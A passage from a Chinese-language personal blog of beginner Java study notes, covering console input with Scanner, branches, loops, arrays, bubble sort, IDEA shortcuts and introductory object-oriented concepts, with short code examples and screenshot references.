main(String [] args)&#123;            Scanner input = new Scanner(System.in);            // 创建input对象, &quot;input&quot;是变量，可为任意值            // System.in 输入流             // 输入数据必须与接受类型匹配，不然会报错 如下图            //Scanner类型没有提供返回char类型数据的方法            /*            可以采用 字符串.charAt(0);   0代表字符串内第一个字符，1代表第二个......            char cc = &quot;你好&quot;.charAt(0);            System.out.println(cc);   ---你            */            System.out.println(&quot;请输入你的年龄&quot;);            int age = input.nextInt();            System.out.println(&quot;你的年龄是&quot;+age);            System.out.println(&quot;请输入你的身高&quot;);            double height = input.nextDouble();            System.out.println(&quot;你的身高是&quot;+height);            System.out.println(&quot;请输入你的姓名&quot;);            String name = input.next();            System.out.println(&quot;你的姓名是&quot;+name);            &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220219224259748.png" alt="image-20220219224259748"></p><h2 id="next与nextLine"><a href="#next与nextLine" class="headerlink" title="next与nextLine"></a>next与nextLine</h2><p>键盘输入一个地址</p><pre><code class="java">/*1、导包2、创建对象3、对象调方法*/import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;您的地址是&quot;);        String address = input.next();        System.out.println(&quot;您的地址是&quot;+address);    &#125;    &#125;</code></pre><p>注意:<br>    next()无法接受 空格之后的内容</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220223643121.png" alt="image-20220220223643121"></p><p>此时我们可以用nextLine(可以接受整行内容)</p><pre><code class="java">String address = input.nextLine();</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220223819952.png" alt="image-20220220223819952"></p><p>nextLine存在一些问题:</p><pre><code class="java">import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);         System.out.println(&quot;您的身高是&quot;);        double height = input.nextDouble();        System.out.println(&quot;您的身高是:&quot;+height);        System.out.println(&quot;您的地址是&quot;);        String address = input.nextLine();        System.out.println(&quot;您的地址是:&quot;+address);    &#125;&#125;</code></pre><p>当代码如上时，运行程序会出现以下后果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220224758917.png" alt="image-20220220224758917"></p><p>我们发现第二个输出直接结束了，这是因为nextLine遇到回车，会误认为代码已经结束了。</p><p>解决办法:</p><p>在中间加入一个</p><pre><code class="java">input.nextLine();</code></pre><p>来接受回车</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220225008607.png" alt="image-20220220225008607"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220225108040.png" alt="image-20220220225108040"></p><p>这样问题就解决了</p><h2 id="if单分支"><a href="#if单分支" class="headerlink" title="if单分支"></a>if单分支</h2><pre><code class="java">/*if分支：    if单分支        if(boolean表达式)&#123;            分支内容        &#125;*/import java.util.*;class IfTest&#123;    public static void main(String [] args)&#123;        Scanner in = new Scanner(System.in);        System.out.println(&quot;请输入您的年龄&quot;);        int age = in.nextInt();        if(age &gt;= 18)&#123;            System.out.println(&quot;您已经成年，可以上网了&quot;);        &#125;        if(age &lt; 18)&#123;            System.out.println(&quot;您还没有成年,please go out!&quot;);        &#125;        &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220231710122.png" alt="image-20220220231710122"></p><h2 id="小习题-闰年的标准"><a href="#小习题-闰年的标准" class="headerlink" title="小习题-闰年的标准"></a>小习题-闰年的标准</h2><p>闰年的标准(两者满足其一即可):</p><p>1、能被4整除，不能被100整除</p><p>2、能被400整除</p><p>代码功能:</p><p>输入一个数判断是否是闰年</p><pre><code class="java">import java.util.*;class RunYears&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;请输入一个年份:&quot;);        int years = input.nextInt();        if((years%4==0&amp;&amp;years%100!=0)||(years%400==0))            System.out.println(years+&quot;是闰年！&quot;);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220233501106.png" alt="image-20220220233501106"></p><h2 id="if双分支"><a href="#if双分支" class="headerlink" title="if双分支"></a>if双分支</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220233824314.png" alt="image-20220220233824314"></p><h2 id="求三个数中的最大值"><a href="#求三个数中的最大值" class="headerlink" title="求三个数中的最大值"></a>求三个数中的最大值</h2><pre><code class="java">import java.util.*;class MaxNum&#123;    public static void main(String [] args)&#123;        int a = 50;        int b = 999;        int c = 12;        if(a &gt; b)&#123;            if(a &gt; c)&#123;                System.out.println(&quot;a是三个数中的最大值&quot;);            &#125;else&#123;                System.out.println(&quot;c是三个数中的最大值&quot;);            &#125;                &#125;else&#123;            if(b &lt; c)&#123;                System.out.println(&quot;c是三个数中的最大值&quot;);            &#125;else&#123;                System.out.println(&quot;b是三个数中的最大值&quot;);            &#125;                    &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221001754310.png" alt="image-20220221001754310"></p><h2 id="if多分支"><a href="#if多分支" class="headerlink" title="if多分支"></a>if多分支</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221002157818.png" alt="image-20220221002157818"></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p> <img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221002546023.png" alt="image-20220221002546023"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221003440041.png" alt="image-20220221003440041"></p><p>case后面的数据必须与表达式类型一致</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>满足特定条件反复执行的代码</p><p>任何一个标准的循环都有四个条件:</p><p><strong>初始化条件</strong></p><p><strong>循环条件</strong></p><p><strong>循环体</strong></p><p><strong>迭代条件</strong></p><p>实例:</p><pre><code class="java">import java.util.*;class Repeat&#123;     public static void main(String [] args)&#123;        int i = 0;        while(i&lt;10)&#123;            System.out.println(&quot;Hello Word&quot;);            i++;        &#125;            &#125;        &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221005248322.png" alt="image-20220221005248322"></p><h1 id="day4-循环"><a href="#day4-循环" class="headerlink" title="day4 循环"></a>day4 循环</h1><h2 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221233148427.png" alt="image-20220221233148427"></p><h2 id="随机数公式"><a href="#随机数公式" class="headerlink" title="随机数公式"></a>随机数公式</h2><p>Math.random();         返回一个double值 [0.0,1.0]</p><p>如果我们要求 m~n的数</p><p>公式: (int)(Math.random()*(n-m+1)+m);</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><pre><code class="java">for 循环:    for(初始化条件;循环条件;迭代条件)&#123;        循环体        &#125;</code></pre><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221234457129.png" alt="image-20220221234457129"></p><h2 id="continue、return、continue的区别"><a href="#continue、return、continue的区别" class="headerlink" title="continue、return、continue的区别"></a>continue、return、continue的区别</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221234650112.png" alt="image-20220221234650112"></p><h1 id="day5-数组"><a href="#day5-数组" class="headerlink" title="day5 数组"></a>day5 数组</h1><h2 id="数组初识"><a href="#数组初识" class="headerlink" title="数组初识"></a>数组初识</h2><p>数组: 容器 存储数据</p><p>相同类型数据的有序集合</p><h3 id="声明一个数组"><a href="#声明一个数组" class="headerlink" title="声明一个数组"></a>声明一个数组</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222000443403.png" alt="image-20220222000443403"></p><h3 id="数组初始化"><a href="#数组初始化" class="headerlink" title="数组初始化"></a>数组初始化</h3><p>两种</p><h4 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h4><pre><code class="java">arr = new int[]&#123;1,2,3,4,5&#125;;  int [] arr1 = new int[]&#123;1,2,3,4,5&#125;;//已经指定元素</code></pre><h4 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h4><pre><code class="java">arr =new int[4]; //没有指定元素double [] arrDouble = new double[5];</code></pre><p>注意:</p><p><strong>数组内元素的类型要保持一致</strong></p><h3 id="数组元素的访问"><a href="#数组元素的访问" class="headerlink" title="数组元素的访问"></a>数组元素的访问</h3><pre><code class="java">int [] arr = &#123;1,2,3&#125;;System.out.println(arr[0]);System.out.println(arr[1]);System.out.println(arr[2 ]);</code></pre><h3 id="数组长度显示"><a href="#数组长度显示" class="headerlink" title="数组长度显示"></a>数组长度显示</h3><p>arr.length 表示数组内元素的数量</p><pre><code class="java">System.out.println(arr.length);    </code></pre><p>获取最后一个元素的巧妙方法</p><pre><code class="java">System.out.println(arr[arr.length-1]);</code></pre><h2 id="数组的默认初始化"><a href="#数组的默认初始化" class="headerlink" title="数组的默认初始化"></a>数组的默认初始化</h2><p>数组声明之后，数据类型不同，数组中就会有不同的默认值</p><p>byte 0   short 0    int  0    long 0    double 0.0    float 0.0     char ‘\u0000’     boolean false</p><p>引用数据类型默认值都是null String</p><h2 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h2><p>1、借用for循环</p><pre><code class="java">for(int i = 0;i&lt;(arr.length-1);i++)&#123;            System.out.println(arr[i]);        &#125;</code></pre><p>2、</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222004651762.png" alt="image-20220222004651762"></p><p>代码:</p><pre><code class="java">import java.util.*;class ArrayTest&#123;     public static void main(String [] args)&#123;        int [] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;        for(int i = 0;i&lt;(arr.length-1);i++)&#123;            System.out.println(arr[i]);        &#125;        System.out.println(&quot;----------------------&quot;);        for(int a :arr)&#123;            System.out.println(a);            &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222005429006.png" alt="image-20220222005429006"></p><h2 id="数组的内存划分"><a href="#数组的内存划分" class="headerlink" title="数组的内存划分"></a>数组的内存划分</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221319026.png" alt="image-20220222221319026"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221347039.png" alt="image-20220222221347039"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221947302.png" alt="image-20220222221947302"></p><h2 id="数组名"><a href="#数组名" class="headerlink" title="数组名"></a>数组名</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222222235753.png" alt="image-20220222222235753"></p><h2 id="数组练习"><a href="#数组练习" class="headerlink" title="数组练习"></a>数组练习</h2><h3 id="学生成绩"><a href="#学生成绩" class="headerlink" title="学生成绩"></a>学生成绩</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222222650621.png" alt="image-20220222222650621"></p><pre><code class="java">import java.util.*;class ArrayTest&#123;    public static void main(String [] args)&#123;        int [] arr = new int[5];        Scanner input =new Scanner(System.in);        int scores = 0;        for(int i = 0;i &lt; 5;i++)&#123;            System.out.println(&quot;请输入第&quot;+(i+1)+&quot;个学生的成绩&quot;);            arr[i] = input.nextInt();            scores = scores+arr[i];        &#125;        float ave = scores/5;        System.out.println(&quot;学生的总成绩是:&quot;+scores);        System.out.println(&quot;学生的平均成绩为:&quot;+ave);                for(int i = 0;i &lt; 5;i++)&#123;            System.out.println(&quot;第&quot;+(i+1)+&quot;个学生的成绩是&quot;+arr[i]);        &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222224720430.png" alt="image-20220222224720430"></p><h3 id="数组找最值"><a href="#数组找最值" class="headerlink" title="数组找最值"></a>数组找最值</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222232917032.png" alt="image-20220222232917032"></p><pre><code class="java">import java.util.*;class ArrayTest&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644&#125;;        int one = arr[0];        for(int i = 1;i &lt; 10;i++)&#123;            if(one &lt; arr[i])&#123;                one = arr[i];            &#125;else&#123;                continue;            &#125;        &#125;        System.out.println(&quot;找到了最大的钻石，它的克拉是&quot;+one);    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222232950262.png" alt="image-20220222232950262"></p><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222233101791.png" alt="image-20220222233101791"></p><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;        System.out.print(&quot;--&gt;&quot;);        int tmp = 0;        for(int j = 0;j&lt; (arr.length-1);j++)&#123;            for(int i = 0;i &lt; (arr.length-1);i++ )&#123;            if(arr[i] &gt; arr[i+1])&#123;                tmp = arr[i];                arr[i] = arr[i+1];                arr[i+1] = tmp;            &#125;else&#123;                continue;            &#125;        &#125;        &#125;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220223002739589.png" alt="image-20220223002739589"></p><p>优化:</p><p>1、专注于处理无序部分</p><pre><code class="java">for(int j = 0;j&lt; (arr.length-1-i);j++)&#123;</code></pre><p>2、解决无效排序</p><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;        System.out.print(&quot;--&gt;&quot;);        int tmp = 0;        for(int j = 0;j&lt; (arr.length-1);j++)&#123;            boolean flag = true;            for(int i = 0;i &lt; (arr.length-1);i++ )&#123;            if(arr[i] &gt; arr[i+1])&#123;                tmp = arr[i];                arr[i] = arr[i+1];                arr[i+1] = tmp;                flag = false;            &#125;else&#123;                continue;            &#125;        &#125;        if(flag == true)            break;        &#125;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;    &#125;    &#125;</code></pre><h1 id="day6-数组"><a href="#day6-数组" class="headerlink" title="day6 数组"></a>day6 数组</h1><h2 id="查找指定元素的下标"><a href="#查找指定元素的下标" class="headerlink" title="查找指定元素的下标"></a>查找指定元素的下标</h2><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;请输入您要查找的元素:&quot;);        int a = input.nextInt();        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        int index = 0;        for(int i = 0;i&lt;arr.length;i++)&#123;            if(a == arr[i])&#123;                index = i;                break;            &#125;else if(i == (arr.length-1))&#123;                System.out.println(&quot;查无此数&quot;);            &#125;        &#125;        System.out.println(&quot;该元素的下标为&quot;+index);    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220224233730725.png" alt="image-20220224233730725"></p><h2 id="二维数组的声明"><a href="#二维数组的声明" class="headerlink" title="二维数组的声明"></a>二维数组的声明</h2><p>二维数组：存储一维数组的数组</p><pre><code class="java">int [][] arr; //推荐int arr[][];</code></pre><h2 id="二维数组的静态初始化"><a href="#二维数组的静态初始化" class="headerlink" title="二维数组的静态初始化"></a>二维数组的静态初始化</h2><pre><code class="java">int [][] arr = &#123;&#123;一维数组元素&#125;,&#123;一维数组元素&#125;,&#123;一维数组元素&#125;&#125;; //方式一double [][] doubleArr = new double[][]&#123;&#123;一维数组元素&#125;,&#123;一维数组元素&#125;,&#123;一维数组元素&#125;&#125;;//方式二</code></pre><h2 id="二维数组的动态初始化"><a href="#二维数组的动态初始化" class="headerlink" title="二维数组的动态初始化"></a>二维数组的动态初始化</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220224235726620.png" alt="image-20220224235726620"></p><pre><code class="java">int [][] arr = new int[5][5];</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225000442619.png" alt="image-20220225000442619"></p><p>这种一维数组可以不等长</p><pre><code class="java">double [][] doubleArr = new double[3][];doubleArr[0] = new double[](3.14,6.28);</code></pre><h2 id="二维数组的遍历"><a href="#二维数组的遍历" class="headerlink" title="二维数组的遍历"></a>二维数组的遍历</h2><h3 id="普通for循环"><a href="#普通for循环" class="headerlink" title="普通for循环"></a>普通for循环</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225001512124.png" alt="image-20220225001512124"></p><h3 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225002726883.png" alt="image-20220225002726883"></p><h2 id="二维数组内存图"><a href="#二维数组内存图" class="headerlink" title="二维数组内存图"></a>二维数组内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224349397.png" alt="image-20220225224349397"></p><h2 id="二维数组练习"><a href="#二维数组练习" class="headerlink" title="二维数组练习"></a>二维数组练习</h2><pre><code class="java">122333444455555</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224754924.png" alt="image-20220225224754924"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224829329.png" alt="image-20220225224829329"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224959416.png" alt="image-20220225224959416"></p><h2 id="idea的使用"><a href="#idea的使用" class="headerlink" title="idea的使用"></a>idea的使用</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225232922084.png" alt="image-20220225232922084"></p><pre><code class="windows">ctrl z 撤销ctrl y 取消撤销</code></pre><p>idea自带快捷键</p><pre><code class="java">以下写出来后+TABpsvm  写一个main方法        public static void main(String[] args) &#123;            &#125;sout  快速输出语句  System.out.println();shift + enter 快速跳到下一行CTRL D 快速删除CTRL ALT 下  快速复制ALT 上/下 快速移动代码CTRL SHIFT F 格式化代码CTRL /  快速单行注释CTRL shift / 快速多行注释</code></pre><h1 id="day7-面向对象"><a href="#day7-面向对象" class="headerlink" title="day7 面向对象"></a>day7 面向对象</h1><h2 id="面向对象思想概述"><a href="#面向对象思想概述" class="headerlink" title="面向对象思想概述"></a>面向对象思想概述</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226000438684.png" alt="image-20220226000438684"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226000448451.png" alt="image-20220226000448451"></p><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001405530.png" alt="image-20220226001405530"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001717468.png" alt="image-20220226001717468"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001904683.png" alt="image-20220226001904683"></p><h2 id="创建类和对象"><a href="#创建类和对象" class="headerlink" title="创建类和对象"></a>创建类和对象</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226002820722.png" alt="image-20220226002820722"></p><h3 id="类的创建"><a href="#类的创建" class="headerlink" title="类的创建"></a>类的创建</h3><pre><code class="java">[权限修饰符] class 类名&#123;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226003024771.png" alt="image-20220226003024771"></p><h3 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h3><pre><code class="java">new 类名();</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226010357542.png" alt="image-20220226010357542"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226010407353.png" alt="image-20220226010407353"></p><h2 id="创建对象内存图"><a href="#创建对象内存图" class="headerlink" title="创建对象内存图"></a>创建对象内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226011045893.png" alt="image-20220226011045893"></p><h2 id="包名相关"><a href="#包名相关" class="headerlink" title="包名相关"></a>包名相关</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226011739538.png" alt="image-20220226011739538"></p><p>包名一般采用公司网址的倒序</p><p>com.guigu.项目名</p><p> com.guigu.shopping.login</p><p>java.lang不需要导包</p><p>java.sql 数据库相关</p><p>java.io  IO流相关</p><p>java.net 网络编程相关</p><p>java.util 一些核心的工具类</p><p>ALT+ENTER 可以自动导包</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228002520958.png" alt="image-20220228002520958"></p><h2 id="示例变量内存图"><a href="#示例变量内存图" class="headerlink" title="示例变量内存图"></a>示例变量内存图</h2><p>栈：存放局部变量  执行方法也会开辟空间  （存储时先进后出）</p><p>本地方法栈: 当执行native方法、c/c++ 存放局部变量、执行方法也会开辟空间</p><p>方法区: 类的信息、变量信息、方法信息、常量信息  …</p><p>堆：用来存放 对象数组等等 new出来的东西</p><p>程序计数器：用于存储下一条指令</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228012112378.png" alt="image-20220228012112378"></p><h2 id="类变量-静态变量"><a href="#类变量-静态变量" class="headerlink" title="类变量(静态变量)"></a>类变量(静态变量)</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228160600660.png" alt="image-20220228160600660"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228162715834.png" alt="image-20220228162715834"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228163846163.png" alt="image-20220228163846163"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228164036100.png" alt="image-20220228164036100"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228161831408.png" alt="image-20220228161831408"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228162235053.png" alt="image-20220228162235053"></p><h2 id="成员变量练习"><a href="#成员变量练习" class="headerlink" title="成员变量练习"></a>成员变量练习</h2><h3 id="声明一个圆的图形类"><a href="#声明一个圆的图形类" class="headerlink" title="声明一个圆的图形类"></a>声明一个圆的图形类</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228164929259.png" alt="image-20220228164929259"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170140156.png" alt="image-20220228170140156"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170151620.png" alt="image-20220228170151620"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170202651.png" alt="image-20220228170202651"></p><h3 id="银行账号"><a href="#银行账号" class="headerlink" title="银行账号"></a>银行账号</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170813217.png" alt="image-20220228170813217"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228172650120.png" alt="image-20220228172650120"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228180754684.png" alt="image-20220228180754684"></p><h3 id="两个类"><a href="#两个类" class="headerlink" title="两个类"></a>两个类</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228181325744.png" alt="image-20220228181325744"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/%5B%5DX%7D@5$I4%256U8%5B%5BX7%7B%25R8I.png" alt="img"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/R$7X6ZT$PCA5@F%EF%BF%BDAIJ28C.png" alt="img"></p><h2 id="成员变量练习内存图"><a href="#成员变量练习内存图" class="headerlink" title="成员变量练习内存图"></a>成员变量练习内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301003149544.png" alt="image-20220301003149544"></p><h2 id="方法的初识"><a href="#方法的初识" class="headerlink" title="方法的初识"></a>方法的初识</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301003317796.png" alt="image-20220301003317796"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301004501890.png" alt="image-20220301004501890"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301004612778.png" alt="image-20220301004612778"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301005234732.png" alt="image-20220301005234732"></p><h2 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010731517.png" alt="image-20220301010731517"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010415100.png" alt="image-20220301010415100"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010426651.png" alt="image-20220301010426651"></p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301011755061.png" alt="image-20220301011755061"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301012111930.png" alt="image-20220301012111930"></p><h2 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013731242.png" alt="image-20220301013731242"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013553565.png" alt="image-20220301013553565"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013625258.png" alt="image-20220301013625258"></p><h1 id="day8面向对象"><a href="#day8面向对象" class="headerlink" title="day8面向对象"></a>day8面向对象</h1><h2 id="基本类型值传递"><a href="#基本类型值传递" class="headerlink" title="基本类型值传递"></a>基本类型值传递</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301221401587.png" alt="image-20220301221401587"></p><h2 id="引用数据类型传递"><a href="#引用数据类型传递" class="headerlink" title="引用数据类型传递"></a>引用数据类型传递</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301222616500.png" alt="image-20220301222616500"></p><h2 id="数组内存图"><a href="#数组内存图" class="headerlink" title="数组内存图"></a>数组内存图</h2><p><img 